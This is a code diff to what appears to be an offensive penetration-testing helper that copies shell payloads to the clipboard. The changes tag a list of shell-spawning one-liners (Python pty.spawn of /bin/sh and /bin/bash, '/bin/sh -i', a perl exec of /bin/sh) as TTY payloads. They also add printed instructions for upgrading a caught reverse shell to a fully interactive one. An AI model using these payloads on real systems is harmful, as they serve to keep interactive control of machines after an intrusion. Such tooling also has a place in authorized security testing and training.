@@ -62,6 +62,14 @@ def php_file_pentestmonkey(payload=None):
 def oneliner(payload):
     print(payload['payload'] + " Copied to clipboard")
     pyperclip.copy(payload['payload'])
+    if 'tty' in payload and payload['tty'] is True:
+        print("Remember:")
+        print("<ctrl+z> # to background"
+              "\nstty raw -echo"
+              "\nfg<enter>"
+              "\n<enter>"
+              "\n<enter>"
+              "\n# optional: export TERM=vt100")
     exit()
 
 
@@ -204,31 +212,38 @@ payloads = [
         'submenu': [
             {
                 'title': '',
-                'payload': 'python -c \'import pty; pty.spawn("/bin/sh")\''
+                'payload': 'python -c \'import pty; pty.spawn("/bin/sh")\'',
+                'tty': True
             },
             {
                 'title': '',
-                'payload': 'python -c \'import pty; pty.spawn("/bin/bash")\''
+                'payload': 'python -c \'import pty; pty.spawn("/bin/bash")\'',
+                'tty': True
             },
             {
                 'title': '',
-                'payload': 'python3 -c \'import pty; pty.spawn("/bin/sh")\''
+                'payload': 'python3 -c \'import pty; pty.spawn("/bin/sh")\'',
+                'tty': True
             },
             {
                 'title': '',
-                'payload': 'python3 -c \'import pty; pty.spawn("/bin/bash")\''
+                'payload': 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
+                'tty': True
             },
             {
                 'title': '',
-                'payload': 'echo os.system(\'/bin/bash\')'
+                'payload': 'echo os.system(\'/bin/bash\')',
+                'tty': True
             },
             {
                 'title': '',
-                'payload': '/bin/sh -i'
+                'payload': '/bin/sh -i',
+                'tty': True
             },
             {
                 'title': '',
-                'payload': 'perl: exec "/bin/sh";'
+                'payload': 'perl: exec "/bin/sh";',
+                'tty': True
             },
         ]
     }
